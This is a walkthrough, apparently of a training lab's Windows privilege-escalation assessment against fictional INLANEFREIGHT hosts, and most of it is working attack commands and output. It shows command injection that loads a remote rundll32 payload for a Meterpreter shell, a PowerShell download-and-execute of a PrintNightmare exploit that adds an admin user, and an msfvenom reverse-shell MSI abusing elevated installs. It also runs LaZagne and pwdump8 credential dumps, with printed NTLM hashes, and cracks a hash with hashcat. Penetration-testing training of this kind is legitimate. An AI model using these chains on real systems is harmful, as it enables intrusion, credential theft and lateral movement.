(This will be divided into PART I & PART II)

# Windows Privilege Escalation Skills Assessment - Part I

## Objectives 

During a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to NT AUTHORITY\SYSTEM level or similar access, and answer the questions below to complete this portion of the assessment.

### Writeup 

#### 1. Which two KBs are installed on the target system? 

Nmap Scan revealed there is a  web server on port 80 listening: 

```
sudo nmap -sC -sV -Pn 10.129.225.46
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 22:26 CDT
Nmap scan report for 10.129.225.46
Host is up (0.077s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: DEV Connection Tester
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINLPE-SKILLS1-SRV
| Not valid before: 2025-10-17T03:25:43
|_Not valid after:  2026-04-18T03:25:43
| rdp-ntlm-info: 
|   Target_Name: WINLPE-SKILLS1-
|   NetBIOS_Domain_Name: WINLPE-SKILLS1-
|   NetBIOS_Computer_Name: WINLPE-SKILLS1-
|   DNS_Domain_Name: WINLPE-SKILLS1-SRV
|   DNS_Computer_Name: WINLPE-SKILLS1-SRV
|   Product_Version: 10.0.14393
|_  System_Time: 2025-10-18T03:27:16+00:00
|_ssl-date: 2025-10-18T03:27:23+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.78 seconds

```
Visiting webserver and keeping in mind **DEV Connection Tester**: 

<img width="1244" height="686" alt="image" src="https://github.com/user-attachments/assets/257e370a-6731-4542-b9ad-ad889f110788" />

Start Metasploit: 

```
sudo msfconsole -q
use exploit/windows/smb/smb_delivery
```

```
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> show options

Module options (exploit/windows/smb/smb_delivery):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CAINPWFILE                    no        Name of file to store Cain&Abel has
                                           hes in. Only supports NTLMv1 hashes
                                           . Can be a path.
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default: none
                                           )
   JOHNPWFILE                    no        Name of file to store JohnTheRipper
                                            hashes in. Supports NTLMv1 and NTL
                                           Mv2 hashes, each of which is stored
                                            in separate files. Can also be a p
                                           ath.
   SHARE                         no        Share (Default: random); cannot con
                                           tain spaces or slashes
   SRVHOST      0.0.0.0          yes       The local host or network interface
                                            to listen on. This must be an addr
                                           ess on the local machine or 0.0.0.0
                                            to listen on all addresses.
   SRVPORT      445              yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     0.0.0.0     yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   DLL



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set LHOST 10.10.15.140
LHOST => 10.10.15.140
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> set SRVHOST 10.10.15.140
SRVHOST => 10.10.15.140
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.15.140:4444 
[msf](Jobs:1 Agents:0) exploit(windows/smb/smb_delivery) >> [*] Server is running. Listening on 10.10.15.140:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.15.140\fwaxf\test.dll,0   <----------------------- here *** 

```
Execute in web-browser with added: 

`127.0.0.1 & rundll32.exe \\10.10.15.140\fwaxf\test.dll,0`

<img width="1252" height="685" alt="image" src="https://github.com/user-attachments/assets/91dd0645-1ee5-4ce2-8b35-32e85119cc3d" />

Back in Metasploit there is a successful session established: 

```
[*] Run the following command on the target machine:
rundll32.exe \\10.10.15.140\fwaxf\test.dll,0
[*] Sending stage (177734 bytes) to 10.129.225.46
[*] Meterpreter session 1 opened (10.10.15.140:4444 -> 10.129.225.46:49672) at 2025-10-17 22:43:55 -0500
```

`ENTER` and then interact with the session:

```
[*] Meterpreter session 1 opened (10.10.15.140:4444 -> 10.129.225.46:49672) at 2025-10-17 22:43:55 -0500

[msf](Jobs:1 Agents:1) exploit(windows/smb/smb_delivery) >> sessions -i 1  <------- this 
[*] Starting interaction with 1...

(Meterpreter 1)(c:\windows\system32\inetsrv) > 
```

Drop into a system command shell:

```
(Meterpreter 1)(c:\windows\system32\inetsrv) > shell
Process 1696 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>

```

Enumerate the installed KBs using wmic:

```
c:\windows\system32\inetsrv>wmic qfe
wmic qfe
Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status  
http://support.microsoft.com/?kbid=3199986  WINLPE-SKILLS1-  Update                        KB3XXXXXX              NT AUTHORITY\SYSTEM  11/21/2016                                      
http://support.microsoft.com/?kbid=3200970  WINLPE-SKILLS1-  Security Update               KB3XXXXXX               NT AUTHORITY\SYSTEM  11/21/2016 

```

#### Answers 
`KB3XXXXXX`
`KB3XXXXXX`


#### 2. Find the password for the ldapadmin account somewhere on the system.


Clone PrintNightmare:

```
$ git clone https://github.com/calebstewart/CVE-2021-1675.git
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 40 (delta 1), reused 1 (delta 1), pack-reused 37 (from 1)
Receiving objects: 100% (40/40), 127.17 KiB | 9.78 MiB/s, done.
Resolving deltas: 100% (9/9), done.
```

Add new line at the bottom of `CVE-2021-1675.ps1`:

```
sudo nano CVE-2021-1675.ps1
```

<img width="1006" height="664" alt="image" src="https://github.com/user-attachments/assets/72b28147-f93b-49df-b6cb-920c1a7807a4" />


Start a web server:

```
$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...

```

Use PowerShell's IEX to invoke the script in the previous web-browser:

`127.0.0.1 | powershell IEX(New-Object Net.Webclient).downloadString('http://IP:PO/CVE-2021-1675.ps1')`

<img width="1223" height="685" alt="image" src="https://github.com/user-attachments/assets/07a39de5-4c56-4014-b427-678e862b494a" />

<img width="1239" height="686" alt="image" src="https://github.com/user-attachments/assets/ed5722f1-209b-4fbd-a1d6-7a9055c9f82a" />

lazange.exe ((in same directory(sorry my directories are in a bad place here)) 

```
wget -q https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
```

Connect with RDP as the newly created user  `Hacker:Pwnd1234!`: 

```
$ xfreerdp /v:10.129.225.46 /u:Hacker /p:'Pwnd1234!' /dynamic-resolution
```

With PowerShell as administrator go to C:\Users\Public\Downloads\ and transfer over lazagne.exe:

```
PS C:\Users\Hacker> cd C:\Users\Public\Downloads\
PS C:\Users\Public\Downloads> wget "http://10.10.15.140:8888/lazagne.exe" -o "lazagne.exe"
```

<img width="1919" height="678" alt="image" src="https://github.com/user-attachments/assets/e06749ad-9533-462d-8910-858a36c621d2" />

Start PowerShell with administrative privileges and run the exploit: 

```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Users\Public\Downloads
PS C:\Users\Public\Downloads> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
[+] System masterkey decrypted for 644d306e-3a7a-434b-bd62-0b81ab91e5b6
[+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6
[+] System masterkey decrypted for 1be9dd5b-844f-4388-a82e-ca7567ffcdbb

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::
mrb3n:1000:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
Hacker:1002:aad3b435b51404eeaad3b435b51404ee:657cc99ace25cc19c7d2902f26fb826d:::

------------------- Lsa_secrets passwords -----------------

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   99 4F 5D 6C 55 B9 EC B5 0C 0B D8 75 A2 88 93 E4    .O]lU......u....
0020   C0 D9 EF C5 0D B9 40 57 92 39 9A BE 9D A5 83 ED    ......@W.9......
0030   11 CB 71 7C AB 32 CD 11 FD 7A ED 2E AB BE F1 62    ..q|.2...z.....b
0040   58 F2 1D 8A AC 9F AC FB 32 17 D8 EE B3 BD A5 DC    X.......2.......
0050   E2 D9 82 77 4A A3 16 D6 F3 B5 E0 28 13 72 C7 2E    ...wJ......(.r..

DPAPI_SYSTEM
0000   01 00 00 00 1D 35 B6 2C 53 EC 28 92 E8 6D D5 BE    .....5.,S.(..m..
0010   C7 4C 78 54 10 66 34 3A 70 3F 77 AF 3F 11 FA 7F    .LxT.f4:p?w.?...
0020   03 8D 79 6A CC 1A FF AC 7C 0E DD D3                ..yj....|...



########## User: Administrator ##########

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
AuthenticationMethod: SIMPLE
Login: ldapadmin
Password: carXXXXXXXXXXXXXX_cr3d$
Host: dc01.inlanefreight.local
Port: 389


########## User: htb-student ##########

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
AuthenticationMethod: SIMPLE
Login: ldapadmin
Password: carXXXXXXXXXXXX_cr3d$
Host: DC01.INLANEFREIGHT.LOCAL
Port: 389


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 13.7820000648
```

ldap admin password: carXXXXXXXXXXXX_cr3d$

#### 3. Escalate privileges and submit the contents of the flag.txt file on the Administrator Desktop.

In the same powershell session locate the flag.txt in the `C:\Users\Administrator\Desktop\`...: 

```
PS C:\Users\Public\Downloads> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop> type flag.txt
Ev3XXXXXXXXXXXXXXXXXXXXXare!
```
(That was easy..)

Password: Ev3XXXXXXXXXXXXXXXXXXXXXare!

#### 4. After escalating privileges, locate a file named confidential.txt. Submit the contents of this file.

This can be found looking around files in `file explorer`: 

<img width="1401" height="687" alt="image" src="https://github.com/user-attachments/assets/ccb1b664-025d-4a2a-9483-7e6a2cb60808" />
<img width="1399" height="695" alt="image" src="https://github.com/user-attachments/assets/bd9aa71f-d81c-4450-9938-eb521e25a2de" />
<img width="1402" height="704" alt="image" src="https://github.com/user-attachments/assets/d1680a44-78c7-423e-8520-e3e5b835e397" />
<img width="1346" height="521" alt="image" src="https://github.com/user-attachments/assets/4af70326-2a50-4499-aa23-1efa80dbb0a4" />

# Windows Privilege Escalation Skills Assessment - Part II

## Objectives 

As an add-on to their annual penetration test, the INLANEFREIGHT organization has asked you to perform a security review of their standard Windows 10 gold image build currently in use by over 1,200 of their employees worldwide. The new CISO is worried that best practices were not followed when establishing the image baseline, and there may be one or more local privilege escalation vectors present in the build. Above all, the CISO wants to protect the company's internal infrastructure by ensuring that an attacker who can gain access to a workstation (through a phishing attack, for example) would be unable to escalate privileges and use that access move laterally through the network. Due to regulatory requirements, INLANEFREIGHT employees do not have local administrator privileges on their workstations.

You have been granted a standard user account with RDP access to a clone of a standard user Windows 10 workstation with no internet access. The client wants as comprehensive an assessment as possible (they will likely hire your firm to test/attempt to bypass EDR controls in the future); therefore, Defender has been disabled. Due to regulatory controls, they cannot allow internet access to the host, so you will need to transfer any tools over yourself.

Enumerate the host fully and attempt to escalate privileges to administrator/SYSTEM level access.

### Writeup

#### 1. Find left behind cleartext credentials for the iamtheadministrator domain admin account.

Searching for credentials: 

```
C:\Users\htb-student>cd C:\

C:\>findstr /spin "iamtheadministrator" *.*
FINDSTR: Cannot open pagefile.sys
FINDSTR: Cannot open Program Files\UNP\UpdateNotificationMgr\.UpdateNotificationMgr_LockFile
FINDSTR: Cannot open ProgramData\Microsoft\Crypto\RSA\MachineKeys\f686aace6942fb7f7ceb231212eef4a4_877168ed-3a96-45d8-9527-edd88a60096b
FINDSTR: Cannot open ProgramData\Microsoft\User Account Pictures\Administrator.dat
FINDSTR: Cannot open ProgramData\Microsoft\User Account Pictures\defaultuser0.dat
FINDSTR: Cannot open ProgramData\Microsoft\User Account Pictures\mrb3n.dat
FINDSTR: Cannot open ProgramData\Microsoft\Windows Defender\IMpService77BDAF73-B396-481F-9042-AD358843EC24.lock
FINDSTR: Cannot open ProgramData\VMware\VMware VGAuth\logfile.txt.0
FINDSTR: Cannot open swapfile.sys
^snip
Windows\Panther\unattend.xml:100:<FullName>INLANEFREIGHT\iamtheadministrator</FullName>   
Windows\Panther\unattend.xml:142:<Username>INLANEFREIGHT\iamtheadministrator</Username>                <------------ these
Windows\Panther\unattend.xml:162:<DisplayName>INLANEFREIGHT\iamtheadministrator</DisplayName>
Windows\Panther\unattend.xml:164:<Name>INLANEFREIGHT\iamtheadministrator</Name>
Windows\Panther\unattend.xml:169:<RegisteredOwner>INLANEFREIGHT\iamtheadministrator</RegisteredOwner>
Windows\Panther\unattend.xml:187:<CommandLine>cmd /C wmic useraccount where name="INLANEFREIGHT\iamtheadministrator" set PasswordExpires=false</CommandLine>
```

directory `Windows\Panther`

```
C:\>cd C:\Windows\Panther

C:\Windows\Panther>dir
 Volume in drive C has no label.
 Volume Serial Number is 823E-9601

 Directory of C:\Windows\Panther

06/06/2021  01:20 PM    <DIR>          .
06/06/2021  01:20 PM    <DIR>          ..
05/25/2021  09:51 PM            44,525 cbs.log
05/25/2021  09:52 PM                68 Contents0.dir
05/25/2021  08:54 PM                68 Contents1.dir
05/25/2021  08:52 PM             1,554 DDACLSys.log
05/25/2021  08:54 PM             6,032 diagerr.xml
05/25/2021  08:54 PM            19,427 diagwrn.xml
06/04/2021  09:38 PM    <DIR>          FastCleanup
05/25/2021  09:52 PM            28,812 MainQueueOnline0.que
05/25/2021  08:54 PM            27,456 MainQueueOnline1.que
10/17/2025  10:22 PM           319,488 setup.etl
05/25/2021  08:52 PM    <DIR>          setup.exe
05/25/2021  08:57 PM           453,075 setupact.log
05/25/2021  08:54 PM               135 setuperr.log
05/25/2021  08:52 PM           110,848 setupinfo
06/06/2021  01:21 PM             8,231 unattend.xml   <---- here
05/25/2021  08:52 PM    <DIR>          UnattendGC
01/09/2020  02:25 PM         1,051,664 _s_6B6D.tmp
03/18/2019  09:43 PM           580,788 _s_734D.tmp
03/18/2019  09:43 PM           756,812 _s_75B0.tmp
              16 File(s)      3,408,983 bytes
               5 Dir(s)   5,748,506,624 bytes free
```

`unattend.xml`

```
type unattend.xml
```
<img width="1270" height="746" alt="image" src="https://github.com/user-attachments/assets/1bbc45e1-77ae-40f0-a2fb-c33d1f58f1da" />


#### 2.Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop.

Create a malicious .msi file on system:

```
$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.15.140 lport=7777 -f msi > aie.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

Start a server to prepare to transfer the file:

```
python3 -m http.server
```

Open PowerShell and download the malicious .msi file to the target:

```
PS C:\Users\htb-student> curl http://10.10.15.140:8000/aie.msi -o "C:\Users\htb-student\Desktop\aie.msi"
```

On Pwnbox, start an nc listener to catch the incoming shell connection:

```
$ nc -lnvp 7777
listening on [any] 7777 ...
```

Click the aie.msi file on the Desktop:

<img width="1569" height="631" alt="image" src="https://github.com/user-attachments/assets/1fff5716-a80f-4d77-a134-ec833bc4f30e" />
<img width="1572" height="708" alt="image" src="https://github.com/user-attachments/assets/8fa9527e-7906-4aa6-b801-f93d965c8f24" />


Check listener for the shell received: 

```
nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.10.15.140] from (UNKNOWN) [10.129.43.33] 49675
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

Locate and open the flag in `C:\users\Administrator\desktop\flag.txt`: 

```
C:\Windows\system32>type C:\users\Administrator\desktop\flag.txt
type C:\users\Administrator\desktop\flag.txt
elXXXXXXXXXXXXXXXXsky
```

Just going to the file will open it up in notepad: 

```
C:\users\Administrator\desktop\flag.txt
```

<img width="1790" height="687" alt="image" src="https://github.com/user-attachments/assets/b196998d-86e9-4ff0-a4a0-dbf22162e8ce" />


#### 3. There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. 
After escalating privileges retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password for this account.

Download https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip

```
$ wget https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
--2025-10-17 23:44:31--  https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump8-8.2.zip
Resolving download.openwall.net (download.openwall.net)... 193.110.157.243
Connecting to download.openwall.net (download.openwall.net)|193.110.157.243|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 541455 (529K) [application/zip]
Saving to: ‘pwdump8-8.2.zip’

pwdump8-8.2.zip                100%[==================================================>] 528.76K   581KB/s    in 0.9s    

2025-10-17 23:44:33 (581 KB/s) - ‘pwdump8-8.2.zip’ saved [541455/541455]
```

Unzip:

```
$ unzip pwdump8-8.2.zip 
Archive:  pwdump8-8.2.zip
   creating: pwdump8/
  inflating: pwdump8/README.txt      
  inflating: pwdump8/pwdump8.exe
```

Go to directory and start python web-server:

```
cd pwdump8/
```
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Use PowerShell to transfer PwDump8.2 to the target by using the previous RDP session:

```
PS C:\Users\htb-student> curl http://10.10.15.140:8000/pwdump8.exe -o "C:\Users\htb-student\Desktop\pwdump8.exe"
```

From the reverse shell  in the last question run PwDump8.exe as the super user:

```
C:\Windows\system32>C:\Users\htb-student\desktop\pwdump8.exe
C:\Users\htb-student\desktop\pwdump8.exe

PwDump v8.2 - dumps windows password hashes - by Fulvio Zanetti & Andrea Petralia @ http://www.blackMath.it

Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:7796EE39FD3A9C3A1844556115AE1A54
Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
DefaultAccount:503:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
WDAGUtilityAccount:504:AAD3B435B51404EEAAD3B435B51404EE:AAD797E20BA0675BBCB3E3DF3319042C
mrb3n:1001:AAD3B435B51404EEAAD3B435B51404EE:7796EE39FD3A9C3A1844556115AE1A54
htb-student:1002:AAD3B435B51404EEAAD3B435B51404EE:3C0E5D303EC84884AD5C3B7876A06EA6
wksadmin:1003:AAD3B435B51404EEAAD3B435B51404EE:5835048CE94AD0564E29A924A03510EF
```

Copy the hash for wksadmin and crack it:

```
$ echo "5835048CE94AD0564E29A924A03510EF" > hash.txt
```

```
hashcat -m 1000 5835048CE94AD0564E29A924A03510EF /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

5835048ce94ad0564e29a924a03510ef:XXXXXXXXXXXrd1    <--------------            
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 5835048ce94ad0564e29a924a03510ef
Time.Started.....: Fri Oct 17 23:52:18 2025 (0 secs)
Time.Estimated...: Fri Oct 17 23:52:18 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  2573.7 kH/s (0.08ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: 123456 -> lovers1

Started: Fri Oct 17 23:52:13 2025
Stopped: Fri Oct 17 23:52:19 2025
```

---









































